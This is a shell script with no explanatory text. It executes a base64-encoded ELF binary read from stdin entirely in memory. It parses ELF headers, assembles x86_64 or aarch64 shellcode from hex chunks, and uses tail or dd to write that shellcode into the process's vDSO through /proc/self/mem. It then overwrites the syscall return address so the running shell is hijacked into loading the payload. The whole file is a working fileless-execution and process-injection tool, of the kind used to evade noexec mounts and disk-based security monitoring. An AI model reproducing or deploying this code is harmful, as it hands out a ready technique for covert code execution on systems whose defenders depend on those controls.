#!/bin/sh

if [ -z "$DEBUG" ]; then DEBUG=0; fi
if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi
if [ -z "$SEEKER" ]; then seeker=tail; else seeker="$SEEKER"; fi
seeker=$(command -v "$seeker")
realname=$(basename "$(readlink -f "$seeker")")
if [ -z "${realname##*box*}" ]; then
    seeker=$(command -v "dd")
fi

convert_endian() {
    echo -n "${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}"
}

retrieve_chunk() {
    echo "$sc_chunks" | grep -w "$1" | cut -f2
}

find_section() {
    local data=""
    if [ "$1" = "file" ]; then
        local header=$(od -v -t x1 -N 64 "$2" | head -n -1 | cut -d' ' -f 2- | tr -d ' \n')
    else
        read -r data
        local header=$(echo -n "$data" | base64 -d | od -v -t x1 -N 64 | head -n -1 | cut -d' ' -f 2- | tr -d ' \n')
    fi

    local shoff=$(convert_endian "${header:80:16}")
    shoff=$((0x"$shoff"))
    local shentsize=$(convert_endian "${header:116:4}")
    shentsize=$((0x"$shentsize"))
    local shentnum=$(convert_endian "${header:120:4}")
    shentnum=$((0x"$shentnum"))
    local shstrndx=$(convert_endian "${header:124:4}")
    shstrndx=$((0x"$shstrndx"))

    if [ "$1" = "file" ]; then
        sections=$(od -v -t x1 -N "$((shentnum * shentsize))" -j "$shoff" "$2" | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        sections=$(echo -n "$data" | base64 -d | od -v -t x1 -N "$((shentnum * shentsize))" -j "$shoff" | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    fi

    local shstrtab_off=$((((shstrndx * shentsize) + 24) * 2))
    shstrtab_off=${sections:$shstrtab_off:16}
    shstrtab_off=$(convert_endian "$shstrtab_off")
    shstrtab_off=$((0x"$shstrtab_off"))

    local shstrtab_size=$((((shstrndx * shentsize) + 32) * 2))
    shstrtab_size=${sections:$shstrtab_size:16}
    shstrtab_size=$(convert_endian "$shstrtab_size")
    shstrtab_size=$((0x"$shstrtab_size"))

    if [ "$1" = "file" ]; then
        local strtab=$(od -v -t x1 -N "$shstrtab_size" -j "$shstrtab_off" "$2" | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        local strtab=$(echo -n "$data" | base64 -d | od -v -t x1 -N "$shstrtab_size" -j "$shstrtab_off" | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    fi

    for i in $(seq 0 $((shentnum - 1))); do
        local section=${sections:$((i * shentsize * 2)):$((shentsize * 2))}
        local section_name_idx=$((0x$(convert_endian "${section:0:8}")))
        local name=$(echo -n "$3" | od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')00
        local section_name=${strtab:$section_name_idx * 2:${#name}}
        if [ "$section_name" = "$name" ]; then
            local section_off=$(convert_endian "${section:24 * 2:16}")
            section_off=$((0x"$section_off"))

            local section_addr=$(convert_endian "${section:16 * 2:16}")
            section_addr=$((0x"$section_addr"))

            local section_size=$(convert_endian "${section:32 * 2:16}")
            section_size=$((0x"$section_size"))

            local section_size_ent=$(convert_endian "${section:56 * 2:16}")
            section_size_ent=$((0x"$section_size_ent"))

            echo -n "$section_off $section_size $section_addr $section_size_ent"
            break
        fi
    done
}

shellcode_loader() {
    if [ "$1" = "bin" ]; then
        local header=$(echo "$bin" | base64 -d | od -t x1 -N 64 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        local header=$(od -tx1 -N 64 "$2" | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    fi

    local phoff=$((0x$(convert_endian "${header:64:16}")))
    local phentsize=$((0x$(convert_endian "${header:108:4}")))
    local phnum=$((0x$(convert_endian "${header:112:4}")))
    local phsize=$(($phnum * $phentsize))

    if [ "$1" = "bin" ]; then
        local phtab=$(echo "$bin" | base64 -d | od -vtx1 -N "$phsize" -j "$phoff" | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        local phtab=$(od -vtx1 -N "$phsize" -j "$phoff" "$2" | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    fi

    local base=0
    local entry=$((0x$(convert_endian "${header:48:16}")))

    if [ "${header:32:4}" = "0300" ]; then
        if [ "$1" = "bin" ]; then
            base=$((0x400000))
        else
            base=$((0x$3))
        fi
        entry=$((entry + base))
    fi

    local writebin=""
    local sc=""

    if [ "$1" = "bin" ]; then
        sc=$sc$(eval echo $(retrieve_chunk prep))
    else
        sc=$sc$(eval echo $(retrieve_chunk openprep))
    fi

    for i in $(seq 0 $((phnum - 1))); do
        local phent=${phtab:$((i * phentsize * 2)):$((phentsize * 2))}
        local phenttype=${phent:0:8}
        local prot=$(convert_endian "${phent:8:8}")

        if [ "$phenttype" = "51e57464" ]; then
            if [ $((0x$prot & 1)) -eq 1 ]; then
                local stack_bottom=$(echo "$shell_maps" | grep -F "[stack]" | cut -d' ' -f1)
                local stack_top=$(echo "$stack_bottom" | cut -d'-' -f2)
                local stack_bottom=0000$(echo "$stack_bottom" | cut -d'-' -f1)
                local stack_size=$((0x$stack_top - 0x$stack_bottom))
                stack_size=$(printf %08x "$stack_size")
                sc=$sc$(eval echo $(retrieve_chunk stackexe))
            fi
            continue
        fi

        if [ "$phenttype" != "01000000" ]; then continue; fi
        local offset=$(convert_endian "${phent:16:16}")
        local virt=$(convert_endian "${phent:32:16}")
        local fsize=$(convert_endian "${phent:64:16}")
        local memsz=$(convert_endian "${phent:80:16}")

        virt=$(printf %016x $((0x$virt + base)))
        local finalvirt=$(((0x$virt + 0x$memsz + 0xfff) & (~0xfff)))

        local origvirt=$virt
        virt=$((0x$virt & (~0xfff)))
        memsz=$((finalvirt - virt))
        memsz=$(printf %08x "$memsz")
        virt=$(printf %016x "$virt")

        local perm=0
        if [ $((0x$prot & 1)) -eq 1 ]; then perm=$((perm | 4)); fi
        if [ $((0x$prot & 2)) -eq 2 ]; then perm=$((perm | 2)); fi
        if [ $((0x$prot & 4)) -eq 4 ]; then perm=$((perm | 1)); fi
        perm=$(printf %08x "$perm")

        if [ "$1" = "bin" ]; then
            sc=$sc$(eval echo $(retrieve_chunk mrmbin))
            writebin=$writebin$(echo "$bin" | base64 -d | od -v -t x1 -N $((0x$fsize)) -j $((0x$offset)) | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
        else
            local off=$((0x$offset & (~0xfff)))
            off=$(printf %016x "$off")

            local sc2=""
            local filelen=$((($(wc -c < "$2") + 0xfff) & (~0xfff)))
            if [ $((0x$off + 0x$memsz)) -gt "$filelen" ]; then
                local diff=$((0x$off + 0x$memsz - $filelen))
                memsz=$((0x$memsz - diff))
                local virt2=$((0x$virt + memsz))
                virt2=$(printf %016x "$virt2")
                memsz=$(printf %08x "$memsz")
                diff=$(printf %08x "$diff")
                sc2=$sc2$(eval echo $(retrieve_chunk mrmfile2))
            fi

            sc=$sc$(eval echo $(retrieve_chunk mrmfile))
            sc=$sc$sc2
        fi

        if [ $((0x$offset)) -le "$phoff" ] && [ "$phoff" -lt $((0x$offset + 0x$fsize)) ]; then
            phaddr=$((phoff - 0x$offset + 0x$origvirt))
        fi
    done
    entry=$(convert_endian $(printf %016x "$entry"))

    local bss_addr=0
    if [ "$1" = "file" ]; then
        sc=$sc$(eval echo $(retrieve_chunk close))
        bss_addr=$(find_section file "$2" .bss | cut -d' ' -f3)
    else
        bss_addr=$(echo -n "$bin" | find_section bin "" .bss | cut -d' ' -f3)
    fi
    if [ -n "$bss_addr" ]; then
        bss_addr=$((bss_addr + base))
        local bss_size=$((finalvirt - bss_addr))
        bss_addr=$(printf %016x "$bss_addr")
        bss_size=$(printf %08x $((bss_size >> 3)))
        sc=$sc$(eval echo $(retrieve_chunk zerobss))
    fi

    phnum=$(convert_endian $(printf %016x "$phnum"))
    phentsize=$(convert_endian $(printf %016x "$phentsize"))
    phaddr=$(convert_endian $(printf %016x "$phaddr"))

    echo -n "$sc $writebin $phnum $phentsize $phaddr $entry"
}

craft_stack() {
    local stack_top=$(echo "$shell_maps" | grep -F "[stack]" | cut -d' ' -f1 | cut -d'-' -f2)
    args_len=$(echo "$@" | cut -d' ' -f6- | wc -c)
    argv0_addr=$((0x$stack_top - 8 - $args_len))

    local count=0
    local stack=$(convert_endian $(printf %016x $(($# - 5))))
    local argvn_addr=$argv0_addr
    local args=""
    for arg in "$@"; do
        if [ $count -lt 5 ]; then count=$((count + 1)); continue; fi
        stack=$stack$(convert_endian $(printf %016x "$argvn_addr"))
        args=$args$(printf "%s" "$arg" | od -v -t x1 | head -n -1 | cut -d' ' -f 2- | tr -d ' \n')00
        argvn_addr=$((argvn_addr + ${#arg} + 1))
    done
    stack=$stack"00000000000000000000000000000000"

    if [ -n "$args" ]; then
        for i in $(seq $((argv0_addr - (argv0_addr & (~7))))); do
            args="00"$args
        done
    fi

    local at_random=$(((argv0_addr & (~7)) - 16))
    if [ $((((${#stack} + ${#args}) / 2) & 0xf)) -eq 0 ]; then
        args="0000000000000000"$args
        at_random=$((at_random - 8))
    fi

    at_random=$(convert_endian $(printf %016x "$at_random"))
    local auxv=""
    auxv=$auxv"0300000000000000"$1
    auxv=$auxv"0400000000000000"$2
    auxv=$auxv"0500000000000000"$3
    if [ -n "$4" ]; then
        auxv=$auxv"0700000000000000"$(convert_endian "$4")
    fi
    auxv=$auxv"0900000000000000"$5
    auxv=$auxv"1900000000000000"$at_random
    auxv=$auxv"0600000000000000""0010000000000000"
    auxv=$auxv"0000000000000000""0000000000000000"
    auxv=$auxv"aaaaaaaaaaaaaaaa""bbbbbbbbbbbbbbbb"

    stack=$stack$auxv$args"0000000000000000"

    local sc=""
    local stack_len=$((${#stack} / 2))
    local sp=$(printf %016x $((0x$stack_top - $stack_len)))
    stack_len=$(printf %08x "$stack_len")
    sc=$sc$(eval echo $(retrieve_chunk stack))

    sc=$sc
    sc=$sc$(eval echo $(retrieve_chunk canary))

    echo -n "$stack $sc"
}

craft_shellcode() {
    local sc=""
    local loadbinsc=$(shellcode_loader bin)
    local writebin=$(echo "$loadbinsc" | cut -d' ' -f2)
    local phnum=$(echo "$loadbinsc" | cut -d' ' -f3)
    local phentsize=$(echo "$loadbinsc" | cut -d' ' -f4)
    local phaddr=$(echo "$loadbinsc" | cut -d' ' -f5)
    local entry=$(echo "$loadbinsc" | cut -d' ' -f6)
    sc=$sc$(echo "$loadbinsc" | cut -d' ' -f1)

    if [ -n "$interp" ]; then
        local ld_base=0000$(echo "$shell_maps" | grep "$(readlink -f "$interp")" | head -n1 | cut -d'-' -f1)
        if [ $((0x$ld_base)) -eq 0 ]; then
            ld_base="00000000fffff000"
        fi
    fi

    local stack=$(craft_stack "$phaddr" "$phentsize" "$phnum" "$ld_base" "$entry" "$@")
    sc=$sc$(echo "$stack" | cut -d' ' -f2)
    stack=$(echo "$stack" | cut -d' ' -f1)

    sc=$sc$(eval echo $(retrieve_chunk dup))

    if [ -n "$interp" ]; then
        local loadldsc=$(shellcode_loader file "$interp" "$ld_base")
        sc=$sc$(echo "$loadldsc" | cut -d' ' -f1)

        ld_start_addr=$(od -t x8 -j 24 -N 8 "$interp" | head -n1 | cut -d' ' -f2)
        ld_start_addr=$((0x$ld_start_addr + 0x$ld_base))
        ld_start_addr=$(printf %016x "$ld_start_addr")

        sc=$sc$(eval echo $(retrieve_chunk jmpld))
    else
        sc=$sc$(eval echo $(retrieve_chunk jmpbin))
    fi
    sc=$sc$(eval echo $(retrieve_chunk jmp))

    if [ $DEBUG -eq 1 ]; then sc=$(eval echo $(retrieve_chunk loop))$sc; fi

    printf "$sc $writebin$stack"
}

arch=$(uname -m)
if [ "$arch" = "x86_64" ]; then
    sc_chunks='prep	4d31c04d89c149f7d041ba32000000
openprep	4831c04889c6b00248bf________________0f054989c041ba12000000
stackexe	4831c0b00a48bf$(convert_endian "$stack_bottom")be$(convert_endian "$stack_size")ba070000000f05
mrmbin	4831c0b00948bf$(convert_endian "$virt")be$(convert_endian "$memsz")ba030000000f054831ff48be$(convert_endian "$origvirt")48ba$(convert_endian "$fsize")4889f80f054829c24801c64885d275f04831c0b00a48bf$(convert_endian "$virt")be$(convert_endian "$memsz")ba$(convert_endian "$perm")0f05
mrmfile2	4d89c44d31c04d89c149f7d041ba320000004831c0b00948bf$(convert_endian "$virt2")be$(convert_endian "$diff")ba$(convert_endian "$perm")0f054d89e0
mrmfile	4831c0b00948bf$(convert_endian "$virt")be$(convert_endian "$memsz")ba$(convert_endian "$perm")49b9$(convert_endian "$off")0f05
close	4831c0b0034c89c70f05
zerobss	4831c0b9$(convert_endian "$bss_size")48bf$(convert_endian "$bss_addr")f348ab
stack	48bc$(convert_endian "$sp")4831ff4889e6ba$(convert_endian "$stack_len")4889f80f0529c24801c685d275f3
canary	48bb${at_random}64488b04252800000048890380c30864488b042530000000488903
dup	4831c04889c6b0024889c7b0210f05
jmpld	48b8$(convert_endian "$ld_start_addr")
jmpbin	48b8$entry
jmp	ffe0
loop	ebfe
'
elif [ "$arch" = "aarch64" ]; then
    sc_chunks='prep	430680d204008092a50005ca
openprep	080780d2600c8092420002ca________________010000d4e40300aa430280d2
stackexe	481c80d24000005803000014$(convert_endian "$stack_bottom")4100005803000014$(convert_endian 00000000"$stack_size")4200005803000014$(convert_endian 0000000000000007)010000d4
mrmbin	c81b80d24000005803000014$(convert_endian "$virt")4100005803000014$(convert_endian 00000000"$memsz")4200005803000014$(convert_endian 0000000000000003)010000d4e80780d24100005803000014$(convert_endian "$origvirt")4200005803000014$(convert_endian "$fsize")000000ca010000d4420000cb2100008b5f0000f161ffff54481c80d24000005803000014$(convert_endian "$virt")4100005803000014$(convert_endian 00000000"$memsz")4200005803000014$(convert_endian 00000000"$perm")010000d4
mrmfile2	f30304aa04008092a50005ca430680d2c81b80d24000005803000014$(convert_endian "$virt2")4100005803000014$(convert_endian 00000000"$diff")4200005803000014$(convert_endian 00000000"$perm")010000d4e40313aa
mrmfile	c81b80d24000005803000014$(convert_endian "$virt")4100005803000014$(convert_endian 00000000"$memsz")4200005803000014$(convert_endian 00000000"$perm")4500005803000014$(convert_endian "$off")010000d4
close	280780d2e00304aa010000d4
zerobss	4000005803000014$(convert_endian "$bss_addr")4100005803000014$(convert_endian 00000000"$bss_size")1f8400f8210400d13f0000f1a1ffff54
stack	4000005803000014$(convert_endian "$sp")1f0000914200005803000014$(convert_endian 00000000"$stack_len")e80780d2e1030091000000ca010000d4420000cb2100008b5f0000f161ffff54
canary	
dup	080380d2400080d2010080d2010000d4
jmpld	4000005803000014$(convert_endian "$ld_start_addr")
jmpbin	4000005803000014$entry
jmp	00001fd6
loop	00000014
'
else
    echo "Error: Unsupported architecture." >&2
    exit 1
fi

read -r bin
shell=$(readlink -f /proc/$$/exe)

if [ -n "$($shell --version 2> /dev/null | grep zsh)" ]; then
    setopt SH_WORD_SPLIT
    setopt KSH_ARRAYS
fi

interp_off=$(echo -n "$bin" | find_section bin "" .interp)
if [ -n "$interp_off" ]; then
    interp_size=$(echo "$interp_off" | cut -d' ' -f2)
    interp_off=$(echo "$interp_off" | cut -d' ' -f1)
    interp=$(echo "$bin" | base64 -d | tail -c +$(($interp_off + 1)) | head -c "$((interp_size - 1))")
fi

if [ $USE_INTERP -eq 1 ]; then
    interp_off=$(find_section file "$seeker" .interp)
    if [ -n "$interp_off" ]; then
        interp_size=$(echo "$interp_off" | cut -d' ' -f2)
        interp_off=$(echo "$interp_off" | cut -d' ' -f1)
        interp_=$(tail -c +$(($interp_off + 1)) "$seeker" | head -c "$((interp_size - 1))")
    fi
fi

shell_maps=$(cat /proc/$$/maps)
shell_base=$(echo "$shell_maps" | grep -w "$shell" | head -n1 | cut -d'-' -f1)
vdso_addr=$((0x$(echo "$shell_maps" | grep -F "[vdso]" | cut -d'-' -f1)))

sc=$(craft_shellcode "$@")
data=$(echo "$sc" | cut -d' ' -f2)
sc=$(echo "$sc" | cut -d' ' -f1)
sc_len=$((${#sc} / 2))

sc=$sc$(echo -n "$interp" | od -vtx1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')00
if [ "$arch" = "x86_64" ]; then
    interp_addr=$(printf %016x $((vdso_addr + sc_len)))
    sc=${sc/________________/$(convert_endian "$interp_addr")}
elif [ "$arch" = "aarch64" ]; then
    pos=${sc%%_*}
    pos=$((${#pos} / 2))
    rel=$((((((sc_len - pos) >> 2) << 5) | 1) | (16 << 24)))
    rel=$(convert_endian $(printf %08x "$rel"))"1f2003d5"
    sc=${sc/________________/$rel}
fi
sc_len=$((${#sc} / 2))

if [ "$arch" = "x86_64" ]; then
    jmp="48b8"$(convert_endian $(printf %016x "$vdso_addr"))"ffe0"
elif [ "$arch" = "aarch64" ]; then
    jmp="4000005800001fd6"$(convert_endian $(printf %016x "$vdso_addr"))
fi

sc=$(printf "$sc" | sed 's/../\\x&/g')
data=$(printf "$data" | sed 's/../\\x&/g')
jmp=$(printf "$jmp" | sed 's/../\\x&/g')

read syscall_info < /proc/self/syscall
addr=$(($(echo "$syscall_info" | cut -d' ' -f9)))
exec 0< <(printf "$data")
exec 3>/proc/self/mem

if [ -z "$SEEKER_ARGS" ]; then
    if [ $(basename "$seeker") = "tail" ]; then
        SEEKER_ARGS='-c +$(($offset + 1))'
    elif [ $(basename "$seeker") = "dd" ]; then
        SEEKER_ARGS='bs=1 skip=$offset'
    elif [ $(basename "$seeker") = "hexdump" ]; then
        SEEKER_ARGS='-s $offset'
    elif [ $(basename "$seeker") = "cmp" ]; then
        SEEKER_ARGS='-i $offset /dev/null'
    else
        echo "Unknown seeker. Provide its arguments in SEEKER_ARGS."
        exit 1
    fi
fi

seeker_args=${SEEKER_ARGS/'$offset'/$vdso_addr}
seeker_args="$(eval echo -n \"$seeker_args\")"
$interp_ "$seeker" $seeker_args <&3 >/dev/null 2>&1
printf "$sc" >&3

exec 3>&-
exec 3>/proc/self/mem

seeker_args=${SEEKER_ARGS/'$offset'/$addr}
seeker_args="$(eval echo -n \"$seeker_args\")"
$interp_ "$seeker" $seeker_args <&3 >/dev/null 2>&1
printf "$jmp" >&3
